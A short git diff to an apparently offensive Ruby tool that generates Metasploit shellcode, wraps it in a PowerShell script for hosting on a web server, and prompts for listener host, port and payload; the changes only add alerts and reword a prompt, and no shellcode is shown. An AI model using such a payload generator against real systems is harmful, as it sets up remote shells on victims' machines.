@@ -21,12 +21,14 @@ begin
   end
   system("chmod +x layout.sh 2> /dev/null") #Make layout.sh executable on the system
   server = Server.new
+  intro_alert
   msfhost_alert
   msf_host = server.set_host
   msf_port = server.set_port
   payload = payload_select
   payload = payload_select until payload == 1 || payload == 2
   payload = available_payloads(payload)
+  print_success("Using PAYLOAD = #{payload}\n")
   unless Dir.exist?(file_root + '/metaspoit_ps_files/')
 		Dir.mkdir(file_root + '/metaspoit_ps_files/')
   end
@@ -36,7 +38,7 @@ begin
   shell_code = generate_shellcode(msf_host, msf_port, payload)
   write_ps(file_path, ps_file, shell_code) #Write the powershell script (to upload on a working webserver)
   print_success("Powershell script generated successfully in '#{file_path}#{ps_file}'\n")
-  hosting = get_input('Host the powershell script locally? [YES/no]: ', 'yes')
+  hosting = get_input('Would you like to host the powershell script on a local web server? [YES/no]: ', 'yes')
   if hosting.downcase[0] == 'y'
     webhost_alert
 	ssl = get_input('Would you like to use ssl? (recommended) [YES/no]: ', 'yes')
